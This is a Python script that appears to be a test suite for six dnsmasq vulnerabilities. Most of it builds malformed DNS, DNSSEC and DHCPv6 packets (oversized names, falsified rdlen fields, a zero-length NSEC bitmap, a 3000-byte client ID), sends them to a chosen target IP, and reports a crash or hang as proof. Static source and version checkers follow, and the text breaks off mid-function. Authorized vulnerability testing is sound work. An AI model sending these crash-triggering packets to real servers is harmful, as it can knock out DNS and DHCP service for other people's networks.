#!/usr/bin/env python3
"""
dnsmasq CVE-2026 Vulnerability Test Suite

Tests for the 6 dnsmasq vulnerabilities disclosed May 2026:
  CVE-2026-2291  - Heap buffer overflow in extract_name() [CRITICAL, CVSS 9.2]
  CVE-2026-5172  - OOB read in extract_addresses() [HIGH, CVSS 7.5]
  CVE-2026-4890  - DNSSEC NSEC infinite loop DoS [HIGH, CVSS 7.5]
  CVE-2026-4891  - DNSSEC RRSIG heap OOB read [MODERATE, CVSS 5.3]
  CVE-2026-4892  - DHCPv6 CLID heap overflow [HIGH, CVSS 8.4]
  CVE-2026-4893  - ECS source validation bypass [MODERATE, CVSS 5.3]

Usage:
  python3 dnsmasq_cve_tester.py --target <IP> [--port 53] [--timeout 5] [--test all|cve-id]

Requirements: Python 3.6+, no external dependencies (uses socket/struct only)
Must run with sufficient privileges for raw socket operations on some tests.

IMPORTANT: These tests are for authorized security testing only.
Only use against systems you own or have explicit permission to test.
"""

import argparse
import socket
import struct
import sys
import time
import os
import random
import signal

RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
BOLD = "\033[1m"


def build_dns_header(txid=None, flags=0x0100, qdcount=1, ancount=0, nscount=0, arcount=0):
    if txid is None:
        txid = random.randint(0, 0xFFFF)
    return struct.pack("!HHHHHH", txid, flags, qdcount, ancount, nscount, arcount)


def encode_domain_name(name):
    parts = name.split(".")
    result = b""
    for part in parts:
        result += bytes([len(part)]) + part.encode("ascii")
    result += b"\x00"
    return result


def encode_long_domain_name(target_length):
    """Build a domain name that when escaped approaches target_length bytes."""
    labels = []
    current_len = 0
    while current_len < target_length - 2:
        remaining = target_length - current_len - 2
        label_len = min(63, remaining)
        if label_len <= 0:
            break
        label = "A" * label_len
        labels.append(label)
        current_len += label_len + 1
    return ".".join(labels)


def send_dns_query(target, port, packet, timeout=5):
    """Send a DNS packet via UDP and return (response, elapsed_time) or (None, elapsed)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    start = time.time()
    try:
        sock.sendto(packet, (target, port))
        response, _ = sock.recvfrom(4096)
        elapsed = time.time() - start
        return response, elapsed
    except socket.timeout:
        elapsed = time.time() - start
        return None, elapsed
    except Exception as e:
        elapsed = time.time() - start
        return None, elapsed
    finally:
        sock.close()


def send_dns_tcp(target, port, packet, timeout=5):
    """Send a DNS packet via TCP (length-prefixed)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((target, port))
        length_prefix = struct.pack("!H", len(packet))
        sock.sendall(length_prefix + packet)
        resp_len_raw = sock.recv(2)
        if len(resp_len_raw) < 2:
            return None, timeout
        resp_len = struct.unpack("!H", resp_len_raw)[0]
        response = b""
        while len(response) < resp_len:
            chunk = sock.recv(resp_len - len(response))
            if not chunk:
                break
            response += chunk
        return response, time.time()
    except (socket.timeout, ConnectionRefusedError, OSError):
        return None, timeout
    finally:
        sock.close()


def check_dns_alive(target, port, timeout=3):
    """Send a simple A query for 'test.local' to check if dnsmasq is responding."""
    txid = random.randint(0, 0xFFFF)
    header = build_dns_header(txid=txid, flags=0x0100)
    question = encode_domain_name("test.local") + struct.pack("!HH", 1, 1)
    packet = header + question
    resp, elapsed = send_dns_query(target, port, packet, timeout)
    return resp is not None


class CVE_2026_2291:
    """
    CVE-2026-2291: Heap buffer overflow in extract_name()

    Root cause: union bigname declares buffer as char name[MAXDNAME] but should be
    (2*MAXDNAME)+1 to account for escaped characters and trailing zero.

    Test: Send a DNS query/response with a domain name that, when escaped internally,
    exceeds MAXDNAME (1025 bytes). If dnsmasq crashes or returns corrupted data,
    it's vulnerable. A patched version rejects the oversized name gracefully.
    """
    CVE_ID = "CVE-2026-2291"
    SEVERITY = "CRITICAL (CVSS 9.2)"
    DESCRIPTION = "Heap buffer overflow in extract_name() - DNS cache poisoning / RCE"

    @staticmethod
    def test(target, port, timeout=5):
        results = {"cve": CVE_2026_2291.CVE_ID, "vulnerable": False, "details": ""}

        # First verify dnsmasq is alive
        if not check_dns_alive(target, port, timeout):
            results["details"] = "dnsmasq not responding before test - cannot determine"
            return results

        # Build a query with an extremely long domain name approaching MAXDNAME
        # MAXDNAME is typically 1025. We craft a name that will be ~1024 bytes encoded
        # to test the boundary. The escaped form may exceed the buffer.
        long_name = encode_long_domain_name(1020)
        txid = random.randint(0, 0xFFFF)
        header = build_dns_header(txid=txid, flags=0x0100)
        question = encode_domain_name(long_name) + struct.pack("!HH", 1, 1)  # A record, IN class
        packet = header + question

        resp, elapsed = send_dns_query(target, port, packet, timeout)

        # Now test with a name that uses characters requiring escaping (dots, backslashes)
        # These double in size during escape processing
        escape_chars = "\\." * 250  # Each \. becomes \\. internally = 4 chars per 2 input
        try:
            # Build manually - labels with special chars that expand during escape
            # Use binary labels with high-bit chars that get \DDD escaped (4 bytes each)
            evil_labels = []
            for i in range(15):
                # Each byte > 127 gets escaped as \DDD (4 chars) in the internal representation
                label = bytes([0x80 + (j % 64) for j in range(63)])
                evil_labels.append(label)

            # Manually construct the DNS name with binary labels
            evil_name = b""
            for label in evil_labels:
                evil_name += bytes([len(label)]) + label
            evil_name += b"\x00"

            header2 = build_dns_header(txid=random.randint(0, 0xFFFF), flags=0x0100)
            question2 = evil_name + struct.pack("!HH", 1, 1)
            packet2 = header2 + question2

            resp2, elapsed2 = send_dns_query(target, port, packet2, timeout)
        except Exception as e:
            resp2 = None
            elapsed2 = timeout

        # Check if dnsmasq is still alive after the attack
        time.sleep(0.5)
        alive_after = check_dns_alive(target, port, timeout)

        if not alive_after:
            results["vulnerable"] = True
            results["details"] = (
                "dnsmasq CRASHED or stopped responding after receiving oversized "
                "domain name - confirms heap buffer overflow in extract_name()"
            )
        elif resp is None and resp2 is None:
            results["details"] = (
                "dnsmasq rejected oversized names (no response) but remained alive - "
                "likely PATCHED (graceful rejection)"
            )
        else:
            # Check if response indicates FORMERR or REFUSED (graceful handling)
            if resp:
                flags = struct.unpack("!H", resp[2:4])[0]
                rcode = flags & 0x0F
                if rcode in (1, 5):  # FORMERR or REFUSED
                    results["details"] = (
                        f"dnsmasq returned RCODE={rcode} for oversized name - "
                        "graceful rejection suggests PATCHED"
                    )
                else:
                    results["details"] = (
                        f"dnsmasq processed oversized name (RCODE={rcode}) - "
                        "may be vulnerable, needs deeper analysis"
                    )
                    results["vulnerable"] = True
            else:
                results["details"] = "Inconclusive - no response but dnsmasq still alive"

        return results


class CVE_2026_5172:
    """
    CVE-2026-5172: OOB read/crash in extract_addresses()

    Root cause: rdlen field in DNS RR can be falsified to be smaller than actual data.
    extract_name() advances pointer past the record end, remaining-bytes underflows
    to a huge number, causing massive heap OOB read and certain crash.

    Test: Send a DNS response with a falsified rdlen that's too small for the RR data.
    If dnsmasq crashes, it's vulnerable. Patched versions validate rdlen bounds.
    """
    CVE_ID = "CVE-2026-5172"
    SEVERITY = "HIGH (CVSS 7.5)"
    DESCRIPTION = "OOB read in extract_addresses() - crash/DoS"

    @staticmethod
    def test(target, port, timeout=5):
        results = {"cve": CVE_2026_5172.CVE_ID, "vulnerable": False, "details": ""}

        if not check_dns_alive(target, port, timeout):
            results["details"] = "dnsmasq not responding before test - cannot determine"
            return results

        # We need dnsmasq to process a DNS response. Strategy:
        # 1. Send a query to dnsmasq for a domain
        # 2. If we can intercept/spoof, send a malformed response
        # Alternative: Use DNS response format directly (works if dnsmasq accepts
        # unsolicited responses on some configurations, or via TCP)

        # Craft a malformed DNS response packet with bad rdlen
        txid = random.randint(0, 0xFFFF)
        # QR=1 (response), AA=1, RD=1, RA=1
        flags = 0x8580
        header = build_dns_header(txid=txid, flags=flags, qdcount=1, ancount=1)

        qname = encode_domain_name("evil.test.local")
        question = qname + struct.pack("!HH", 1, 1)  # A record, IN

        # Answer section with falsified rdlen
        # Name pointer to question (offset 12)
        ans_name = struct.pack("!H", 0xC00C)
        # Type A, Class IN, TTL 300
        ans_fixed = struct.pack("!HHI", 1, 1, 300)
        # rdlen = 2 (too small for a 4-byte A record, but we put a CNAME-like name after)
        # This makes extract_name advance past the declared rdlen boundary
        fake_rdlen = struct.pack("!H", 2)
        # Actual rdata is longer than declared - contains a domain name pointer
        # that will cause extract_name to read past the boundary
        rdata = struct.pack("!H", 0xC00C)  # pointer back - matches rdlen=2
        # But add extra data that looks like another name extension
        rdata_overflow = b"\x05extra\x04data\x00"

        packet = header + question + ans_name + ans_fixed + fake_rdlen + rdata + rdata_overflow

        # Send as a response - dnsmasq may not process unsolicited responses,
        # so we'll first trigger a query then race with our crafted response
        # For testing, send via TCP where we can control the conversation better

        # Method 1: Send the malformed packet directly (testing parser)
        resp, elapsed = send_dns_query(target, port, packet, timeout)

        # Method 2: Craft a response with CNAME that has mismatched rdlen
        txid2 = random.randint(0, 0xFFFF)
        header2 = build_dns_header(txid=txid2, flags=0x8580, qdcount=1, ancount=1)
        qname2 = encode_domain_name("test2.evil.local")
        question2 = qname2 + struct.pack("!HH", 1, 1)

        # CNAME answer with rdlen claiming 4 bytes but actual name is longer
        ans2_name = struct.pack("!H", 0xC00C)
        ans2_fixed = struct.pack("!HHI", 5, 1, 300)  # Type CNAME
        # rdlen = 4, but the CNAME target encoded is much longer
        ans2_rdlen = struct.pack("!H", 4)
        # CNAME target that's longer than 4 bytes
        cname_target = encode_domain_name("very.long.cname.target.example.com")
        ans2_rdata = cname_target[:4]  # Only 4 bytes per rdlen, but parser may read more

        packet2 = header2 + question2 + ans2_name + ans2_fixed + ans2_rdlen + cname_target

        resp2, elapsed2 = send_dns_query(target, port, packet2, timeout)

        time.sleep(0.5)
        alive_after = check_dns_alive(target, port, timeout)

        if not alive_after:
            results["vulnerable"] = True
            results["details"] = (
                "dnsmasq CRASHED after receiving DNS response with falsified rdlen - "
                "confirms OOB read in extract_addresses()"
            )
        else:
            results["details"] = (
                "dnsmasq survived malformed rdlen packets - likely PATCHED "
                "(validates rdlen bounds before extract_name traversal)"
            )

        return results


class CVE_2026_4890:
    """
    CVE-2026-4890: DNSSEC NSEC bitmap parsing infinite loop

    Root cause: NSEC bitmap parsing advances pointer by p[1] instead of p[1]+2
    (missing 2-byte window header). With bitmap_length=0, both rdlen and p are
    unchanged, causing infinite loop. Reachable BEFORE RRSIG validation.

    Test: Send a crafted NSEC record with bitmap_length=0. If dnsmasq stops
    responding (hangs), it's vulnerable. Patched versions skip zero-length bitmaps.

    NOTE: Only affects dnsmasq compiled with DNSSEC support (--dnssec flag).
    """
    CVE_ID = "CVE-2026-4890"
    SEVERITY = "HIGH (CVSS 7.5)"
    DESCRIPTION = "DNSSEC NSEC infinite loop DoS (requires --dnssec)"

    @staticmethod
    def test(target, port, timeout=5):
        results = {"cve": CVE_2026_4890.CVE_ID, "vulnerable": False, "details": ""}

        if not check_dns_alive(target, port, timeout):
            results["details"] = "dnsmasq not responding before test - cannot determine"
            return results

        # First check if DNSSEC is likely enabled by querying with DO bit
        txid = random.randint(0, 0xFFFF)
        # Build query with EDNS0 OPT record and DO bit
        header = build_dns_header(txid=txid, flags=0x0100, arcount=1)
        question = encode_domain_name("dnssec-test.example.com") + struct.pack("!HH", 1, 1)
        # OPT pseudo-RR: name=root, type=OPT(41), udp_size=4096, ext_rcode=0, version=0, DO=1
        opt_rr = b"\x00" + struct.pack("!HH", 41, 4096) + struct.pack("!BBH", 0, 0, 0x8000) + struct.pack("!H", 0)
        probe_packet = header + question + opt_rr

        probe_resp, _ = send_dns_query(target, port, probe_packet, timeout)

        # Now craft a response containing an NSEC record with zero-length type bitmap
        # This simulates what an attacker's authoritative server would return
        txid2 = random.randint(0, 0xFFFF)
        resp_header = build_dns_header(
            txid=txid2, flags=0x8580,  # QR=1, AA=1, RD=1, RA=1
            qdcount=1, ancount=0, nscount=1, arcount=0
        )
        qname = encode_domain_name("trigger.example.com")
        question2 = qname + struct.pack("!HH", 1, 1)

        # NSEC record in authority section
        nsec_owner = struct.pack("!H", 0xC00C)  # pointer to question name
        nsec_type = struct.pack("!HH", 47, 1)  # Type=NSEC(47), Class=IN
        nsec_ttl = struct.pack("!I", 300)

        # NSEC RDATA: next-domain-name + type bitmaps
        next_domain = encode_domain_name("next.example.com")
        # Type bitmap with window=0, bitmap_length=0 (the trigger!)
        # Window number (1 byte) + bitmap length (1 byte) + bitmap data
        evil_bitmap = struct.pack("BB", 0, 0)  # window=0, length=0 -> infinite loop

        nsec_rdata = next_domain + evil_bitmap
        nsec_rdlen = struct.pack("!H", len(nsec_rdata))

        nsec_rr = nsec_owner + nsec_type + nsec_ttl + nsec_rdlen + nsec_rdata
        packet = resp_header + question2 + nsec_rr

        # Send the malicious NSEC response
        resp, elapsed = send_dns_query(target, port, packet, timeout)

        # Also try via a legitimate query that would trigger DNSSEC validation
        # by asking for a DNSKEY record
        txid3 = random.randint(0, 0xFFFF)
        header3 = build_dns_header(txid=txid3, flags=0x0100, arcount=1)
        dnskey_q = encode_domain_name("example.com") + struct.pack("!HH", 48, 1)  # DNSKEY
        opt_rr2 = b"\x00" + struct.pack("!HH", 41, 4096) + struct.pack("!BBH", 0, 0, 0x8000) + struct.pack("!H", 0)
        packet3 = header3 + dnskey_q + opt_rr2
        send_dns_query(target, port, packet3, timeout=2)

        # Wait and check if dnsmasq is still responding
        time.sleep(2)
        alive_after = check_dns_alive(target, port, timeout)

        if not alive_after:
            results["vulnerable"] = True
            results["details"] = (
                "dnsmasq STOPPED RESPONDING after NSEC record with bitmap_length=0 - "
                "confirms infinite loop in DNSSEC NSEC bitmap parsing. "
                "Process is likely hung (not crashed)."
            )
        else:
            if probe_resp:
                # Check if EDNS was in the response (indicates DNSSEC support)
                results["details"] = (
                    "dnsmasq survived NSEC bitmap_length=0 - either PATCHED or "
                    "DNSSEC not compiled in. Check: dnsmasq --version | grep DNSSEC"
                )
            else:
                results["details"] = (
                    "dnsmasq did not respond to EDNS/DO probe - DNSSEC likely not enabled. "
                    "This CVE only affects dnsmasq with --dnssec. "
                    "Verify with: dnsmasq --version | grep -i 'DNSSEC'"
                )

        return results


class CVE_2026_4891:
    """
    CVE-2026-4891: DNSSEC RRSIG heap OOB read

    Root cause: rdlen field in RRSIG packets not validated. A crafted packet with
    rdlen smaller than fixed RRSIG data + signer's name produces a negative
    calculated signature length, causing heap OOB read.

    Test: Send an RRSIG record where rdlen < (18 + signer_name_length).
    If dnsmasq leaks memory or crashes, it's vulnerable.

    NOTE: Only affects dnsmasq compiled with DNSSEC support.
    """
    CVE_ID = "CVE-2026-4891"
    SEVERITY = "MODERATE (CVSS 5.3)"
    DESCRIPTION = "DNSSEC RRSIG heap OOB read - info disclosure"

    @staticmethod
    def test(target, port, timeout=5):
        results = {"cve": CVE_2026_4891.CVE_ID, "vulnerable": False, "details": ""}

        if not check_dns_alive(target, port, timeout):
            results["details"] = "dnsmasq not responding before test - cannot determine"
            return results

        # Craft a DNS response with an RRSIG record having rdlen too small
        txid = random.randint(0, 0xFFFF)
        resp_header = build_dns_header(
            txid=txid, flags=0x8580,
            qdcount=1, ancount=1, nscount=0, arcount=0
        )
        qname = encode_domain_name("rrsig-test.example.com")
        question = qname + struct.pack("!HH", 1, 1)

        # RRSIG answer
        rrsig_owner = struct.pack("!H", 0xC00C)
        rrsig_type_class = struct.pack("!HH", 46, 1)  # Type=RRSIG(46), Class=IN
        rrsig_ttl = struct.pack("!I", 300)

        # RRSIG fixed fields (18 bytes minimum):
        # type_covered(2) + algorithm(1) + labels(1) + orig_ttl(4) +
        # sig_expiration(4) + sig_inception(4) + key_tag(2) = 18 bytes
        # Then: signer's name (variable) + signature (variable)
        rrsig_fixed = struct.pack("!HBBI", 1, 8, 3, 86400)  # covers A, algo 8, 3 labels
        rrsig_fixed += struct.pack("!II", 0x67000000, 0x66000000)  # expiry, inception
        rrsig_fixed += struct.pack("!H", 12345)  # key tag

        signer_name = encode_domain_name("example.com")  # 13 bytes
        # Total minimum rdlen should be 18 + 13 = 31 bytes
        # We declare rdlen = 10 (way too small) to trigger the underflow
        evil_rdlen = struct.pack("!H", 10)

        # Put some data that looks like valid RRSIG but with bad rdlen
        rrsig_rdata = rrsig_fixed + signer_name + b"\x00" * 64  # fake signature

        rrsig_rr = rrsig_owner + rrsig_type_class + rrsig_ttl + evil_rdlen + rrsig_rdata
        packet = resp_header + question + rrsig_rr

        resp, elapsed = send_dns_query(target, port, packet, timeout)

        # Send multiple to increase chance of observable effect
        for _ in range(3):
            send_dns_query(target, port, packet, timeout=2)
            time.sleep(0.2)

        time.sleep(0.5)
        alive_after = check_dns_alive(target, port, timeout)

        if not alive_after:
            results["vulnerable"] = True
            results["details"] = (
                "dnsmasq CRASHED after RRSIG with undersized rdlen - "
                "confirms heap OOB read in validate_rrset()"
            )
        else:
            results["details"] = (
                "dnsmasq survived malformed RRSIG packets - either PATCHED "
                "(rdlen validated before use) or DNSSEC not compiled in"
            )

        return results


class CVE_2026_4892:
    """
    CVE-2026-4892: DHCPv6 CLID heap buffer overflow -> local root

    Root cause: DHCPv6 CLIDs up to 65535 bytes get hex-encoded via sprintf("%.2x")
    into daemon->packet (5131 bytes). A 1000-byte CLID writes ~3000 bytes overflow.
    The helper process retains root privileges.

    Test: Send a DHCPv6 SOLICIT message with an oversized Client Identifier option.
    If the dnsmasq helper crashes, it's vulnerable.

    NOTE: Requires DHCPv6 + --dhcp-script to be configured.
    NOTE: This is a LOCAL attack vector (requires network adjacency).
    """
    CVE_ID = "CVE-2026-4892"
    SEVERITY = "HIGH (CVSS 8.4)"
    DESCRIPTION = "DHCPv6 CLID overflow -> local root (requires --dhcp-script + DHCPv6)"

    @staticmethod
    def test(target, port=547, timeout=5):
        results = {"cve": CVE_2026_4892.CVE_ID, "vulnerable": False, "details": ""}

        # DHCPv6 uses UDP port 547 (server) / 546 (client)
        # Build a DHCPv6 SOLICIT message with oversized Client ID

        # DHCPv6 message format:
        # msg-type (1 byte) + transaction-id (3 bytes) + options
        msg_type = 1  # SOLICIT
        transaction_id = random.randint(0, 0xFFFFFF)

        dhcp6_header = struct.pack("!I", (msg_type << 24) | transaction_id)

        # Option 1: Client Identifier (DUID)
        # Option code = 1, option length = variable
        # We make a CLID of 3000 bytes - when hex-encoded (6000 chars) this overflows
        # the 5131-byte daemon->packet buffer
        clid_data = bytes([0x41 + (i % 26) for i in range(3000)])
        opt_clientid = struct.pack("!HH", 1, len(clid_data)) + clid_data

        # Option 3: IA_NA (Identity Association for Non-temporary Addresses)
        ia_na_data = struct.pack("!IHH", 1, 3600, 5400)  # IAID, T1, T2
        opt_ia_na = struct.pack("!HH", 3, len(ia_na_data)) + ia_na_data

        # Option 8: Elapsed Time
        opt_elapsed = struct.pack("!HHH", 8, 2, 0)

        packet = dhcp6_header + opt_clientid + opt_ia_na + opt_elapsed

        try:
            sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            # DHCPv6 server listens on port 547
            # For testing, we try to send to the target
            # Note: may need link-local address and interface specification
            try:
                sock.sendto(packet, (target, 547))
                try:
                    response, _ = sock.recvfrom(4096)
                    results["details"] = (
                        "DHCPv6 server responded - oversized CLID was processed. "
                        "If --dhcp-script is configured, the helper may have overflowed. "
                        "Check dnsmasq logs for crashes in the script helper process."
                    )
                    results["vulnerable"] = True
                except socket.timeout:
                    results["details"] = (
                        "No DHCPv6 response - either DHCPv6 not enabled, not configured "
                        "for this subnet, or CLID was rejected (PATCHED). "
                        "This CVE requires: DHCPv6 active + --dhcp-script configured."
                    )
            except OSError as e:
                if "Network is unreachable" in str(e) or "Cannot assign" in str(e):
                    # Try IPv4 fallback - won't work for DHCPv6 but report clearly
                    results["details"] = (
                        f"Cannot reach target via IPv6 ({e}). "
                        "CVE-2026-4892 requires DHCPv6 (IPv6 network adjacency). "
                        "Test from a host on the same IPv6-enabled LAN segment."
                    )
                else:
                    results["details"] = f"Network error: {e}"
        except Exception as e:
            results["details"] = (
                f"DHCPv6 test error: {e}. "
                "This test requires IPv6 connectivity to the target. "
                "Run from a host on the same network segment."
            )
        finally:
            try:
                sock.close()
            except:
                pass

        return results


class CVE_2026_4893:
    """
    CVE-2026-4893: ECS (EDNS Client Subnet) source validation bypass

    Root cause: With --add-subnet enabled, process_reply() passes the OPT record
    length (~23 bytes) instead of the full packet length to check_source().
    All internal bounds checks fail, function always returns 1.

    Test: Send a DNS query with EDNS Client Subnet option containing a spoofed
    source address. If dnsmasq accepts and caches the response without validating
    the ECS source, it's vulnerable.

    NOTE: Only affects dnsmasq with --add-subnet configured.
    """
    CVE_ID = "CVE-2026-4893"
    SEVERITY = "MODERATE (CVSS 5.3)"
    DESCRIPTION = "ECS source validation bypass (requires --add-subnet)"

    @staticmethod
    def test(target, port, timeout=5):
        results = {"cve": CVE_2026_4893.CVE_ID, "vulnerable": False, "details": ""}

        if not check_dns_alive(target, port, timeout):
            results["details"] = "dnsmasq not responding before test - cannot determine"
            return results

        # Build DNS query with EDNS Client Subnet (ECS) option
        # RFC 7871 - EDNS Client Subnet
        txid = random.randint(0, 0xFFFF)
        header = build_dns_header(txid=txid, flags=0x0100, arcount=1)
        question = encode_domain_name("ecs-test.example.com") + struct.pack("!HH", 1, 1)

        # OPT record with ECS option
        # ECS option: code=8 (CLIENT-SUBNET), family=1(IPv4), source_prefix=24, scope=0
        # Address: 192.168.99.0 (spoofed - not our real subnet)
        ecs_option_code = 8
        ecs_family = 1  # IPv4
        ecs_source_prefix = 24
        ecs_scope_prefix = 0
        ecs_address = socket.inet_aton("192.168.99.0")[:3]  # Only 3 bytes for /24

        ecs_data = struct.pack("!HBB", ecs_family, ecs_source_prefix, ecs_scope_prefix)
        ecs_data += ecs_address
        ecs_option = struct.pack("!HH", ecs_option_code, len(ecs_data)) + ecs_data

        # OPT pseudo-RR
        opt_name = b"\x00"  # root
        opt_type = struct.pack("!H", 41)  # OPT
        opt_udp_size = struct.pack("!H", 4096)
        opt_ext_rcode = struct.pack("!B", 0)
        opt_version = struct.pack("!B", 0)
        opt_flags = struct.pack("!H", 0)  # No DO bit
        opt_rdlen = struct.pack("!H", len(ecs_option))

        opt_rr = opt_name + opt_type + opt_udp_size + opt_ext_rcode + opt_version + opt_flags + opt_rdlen + ecs_option

        packet = header + question + opt_rr

        resp, elapsed = send_dns_query(target, port, packet, timeout)

        # Send a second query with a DIFFERENT spoofed source to see if caching differs
        txid2 = random.randint(0, 0xFFFF)
        header2 = build_dns_header(txid=txid2, flags=0x0100, arcount=1)
        question2 = encode_domain_name("ecs-test.example.com") + struct.pack("!HH", 1, 1)

        ecs_address2 = socket.inet_aton("10.99.99.0")[:3]
        ecs_data2 = struct.pack("!HBB", ecs_family, ecs_source_prefix, ecs_scope_prefix)
        ecs_data2 += ecs_address2
        ecs_option2 = struct.pack("!HH", ecs_option_code, len(ecs_data2)) + ecs_data2
        opt_rdlen2 = struct.pack("!H", len(ecs_option2))
        opt_rr2 = opt_name + opt_type + opt_udp_size + opt_ext_rcode + opt_version + opt_flags + opt_rdlen2 + ecs_option2

        packet2 = header2 + question2 + opt_rr2
        resp2, elapsed2 = send_dns_query(target, port, packet2, timeout)

        if resp and resp2:
            # Check if ECS was echoed back in responses
            has_ecs_resp1 = b"\x00\x08" in resp[12:]  # ECS option code in response
            has_ecs_resp2 = b"\x00\x08" in resp2[12:]

            if has_ecs_resp1 or has_ecs_resp2:
                results["details"] = (
                    "dnsmasq echoed ECS option in response - --add-subnet is active. "
                    "Source validation bypass cannot be confirmed remotely without "
                    "cache inspection. Recommend checking dnsmasq version < 2.92rel2. "
                    "If version is vulnerable, ECS source checks are completely bypassed."
                )
                results["vulnerable"] = True
            else:
                results["details"] = (
                    "dnsmasq responded but without ECS echo - --add-subnet may not be "
                    "configured, making this CVE not applicable"
                )
        elif resp is None and resp2 is None:
            results["details"] = (
                "No response to ECS queries - --add-subnet likely not configured "
                "or queries blocked. CVE-2026-4893 not applicable without --add-subnet."
            )
        else:
            results["details"] = (
                "Partial responses received - inconclusive. "
                "Check if --add-subnet is in dnsmasq configuration."
            )

        return results


# ============================================================================
# Static Source Analysis Tools
# ============================================================================

class StaticAnalyzer:
    """Analyze dnsmasq source code to determine vulnerability status without network testing."""

    @staticmethod
    def check_source(source_dir):
        results = []

        # CVE-2026-2291: union bigname buffer size
        # FIX: char name[(2*MAXDNAME)+1]  VULN: char name[MAXDNAME]
        dnsmasq_h = os.path.join(source_dir, "src", "dnsmasq.h")
        if os.path.exists(dnsmasq_h):
            with open(dnsmasq_h, "r") as f:
                content = f.read()
            if "2*MAXDNAME" in content or "2 * MAXDNAME" in content or "MAXDNAME*2" in content:
                results.append(("CVE-2026-2291", "PATCHED",
                                "bigname buffer enlarged to 2*MAXDNAME"))
            elif "char name[MAXDNAME]" in content:
                results.append(("CVE-2026-2291", "VULNERABLE",
                                "bigname buffer is only MAXDNAME — heap overflow"))
            else:
                results.append(("CVE-2026-2291", "UNKNOWN", "Cannot determine buffer size"))
        else:
            results.append(("CVE-2026-2291", "UNKNOWN", "dnsmasq.h not found"))

        # CVE-2026-5172: extract_addresses rdlen bounds check
        # FIX adds: "if (p1 > endrr)" after extract_name in extract_addresses
        rfc1035_c = os.path.join(source_dir, "src", "rfc1035.c")
        if os.path.exists(rfc1035_c):
            with open(rfc1035_c, "r") as f:
                content = f.read()
            if "p1 > endrr" in content or "p1 >= endrr" in content:
                results.append(("CVE-2026-5172", "PATCHED",
                                "p1 > endrr bounds check present"))
            else:
                results.append(("CVE-2026-5172", "VULNERABLE",
                                "no p1 vs endrr bounds check — OOB read possible"))
        else:
            results.append(("CVE-2026-5172", "UNKNOWN", "rfc1035.c not found"))

        # CVE-2026-4890: NSEC bitmap advance
        # FIX: "p += p[1] + 2" and "rdlen -= p[1] + 2"
        # VULN: "p +=  p[1]" and "rdlen -= p[1]" (without +2)
        dnssec_c = os.path.join(source_dir, "src", "dnssec.c")
        if os.path.exists(dnssec_c):
            with open(dnssec_c, "r") as f:
                content = f.read()
            if "p[1] + 2" in content or "p[1]+2" in content:
                results.append(("CVE-2026-4890", "PATCHED",
                                "bitmap advances by p[1]+2"))
            elif "p +=  p[1]" in content or "p += p[1]" in content:
                results.append(("CVE-2026-4890", "VULNERABLE",
                                "bitmap advances by p[1] only — infinite loop possible"))
            else:
                results.append(("CVE-2026-4890", "UNKNOWN", "Cannot find bitmap advance pattern"))

            # CVE-2026-4891: RRSIG rdlen validation before sig_len
            # FIX adds: "(p - psav) > rdlen" check before computing sig_len
            if "p - psav" in content and "rdlen" in content and (
                    "p - psav) > rdlen" in content or "p - psav) >= rdlen" in content):
                results.append(("CVE-2026-4891", "PATCHED",
                                "(p - psav) > rdlen check present"))
            elif "sig_len = rdlen - (p - psav)" in content or "sig_len" in content:
                results.append(("CVE-2026-4891", "VULNERABLE",
                                "sig_len computed without rdlen bounds check — OOB read possible"))
            else:
                results.append(("CVE-2026-4891", "UNKNOWN", "Cannot find sig_len pattern"))
        else:
            results.append(("CVE-2026-4890", "N/A", "No dnssec.c — DNSSEC not compiled"))
            results.append(("CVE-2026-4891", "N/A", "No dnssec.c — DNSSEC not compiled"))

        # CVE-2026-4892: DHCPv6 CLID hex-encoding overflow
        # FIX adds: clid_max/packet_buff_sz check before the hex encoding loop
        # VULN: "for (p = daemon->packet, i = 0; i < data.clid_len" without length limit
        helper_c = os.path.join(source_dir, "src", "helper.c")
        if os.path.exists(helper_c):
            with open(helper_c, "r") as f:
                content = f.read()
            if "clid_max" in content or "packet_buff_sz / 3" in content or "packet_buff_sz) / 3" in content:
                results.append(("CVE-2026-4892", "PATCHED",
                                "CLID length bounded before hex encoding"))
            elif "for (p = daemon->packet" in content and "data.clid_len" in content:
                results.append(("CVE-2026-4892", "VULNERABLE",
                                "CLID hex-encoded without length limit — heap overflow possible"))
            else:
                results.append(("CVE-2026-4892", "UNKNOWN", "Cannot find CLID encoding pattern"))
        else:
            results.append(("CVE-2026-4892", "N/A", "No helper.c found"))

        # CVE-2026-4893: ECS check_source parameter
        # FIX: check_source(header, n, ...)  VULN: check_source(header, plen, ...)
        forward_c = os.path.join(source_dir, "src", "forward.c")
        if os.path.exists(forward_c):
            with open(forward_c, "r") as f:
                content = f.read()
            if "check_source(header, n," in content:
                results.append(("CVE-2026-4893", "PATCHED",
                                "check_source receives full packet length"))
            elif "check_source(header, plen," in content:
                results.append(("CVE-2026-4893", "VULNERABLE",
                                "check_source receives OPT length — validation bypassed"))
            elif "check_source" not in content:
                results.append(("CVE-2026-4893", "N/A",
                                "No check_source — --add-subnet not supported"))
            else:
                results.append(("CVE-2026-4893", "UNKNOWN", "Cannot determine check_source parameter"))
        else:
            results.append(("CVE-2026-4893", "N/A", "No forward.c found"))

        return results


# ============================================================================
# Version Checker
# ============================================================================

class VersionChecker:
    """Check dnsmasq version from binary or source to determine vulnerability."""

    FIXED_VERSION = (2, 92, 2)  # 2.92rel2

    @staticmethod
    def parse_version(version_str):
        """Parse version string like '2.78', '2.90', '2.92rel2' into tuple."""
        version_str = version_str.strip().lower()
        version_str = version_str.replace("rel", ".").replace("rc", ".0.")
        parts = version_str.split(".")
        result = []
        for p in parts:
            try:
                result.append(int(p))
            except ValueError:
                pass
        while len(result) < 3:
            result.append(0)
        return tuple(result[:3])

    @classmethod
    def is_vulnerable(cls, version_str):
        """Returns True if the version is below the fix version."""
        ver = cls.parse_version(version_str)
        return ver < cls.FIXED_VERSION

    @classmethod
    def check_binary(cls, binary_path):
        """Try to extract version from a dnsmasq binary."""
        if not os.path.exists(binary_path):
            return None, "Binary not found"

        try:
            import subprocess
            result = subprocess.run(
                [binary_path, "--version"],
                capture_output=True, text=True, timeout=5
            )
            output = result.stdout + result.stderr
            for line in output.split("\n"):
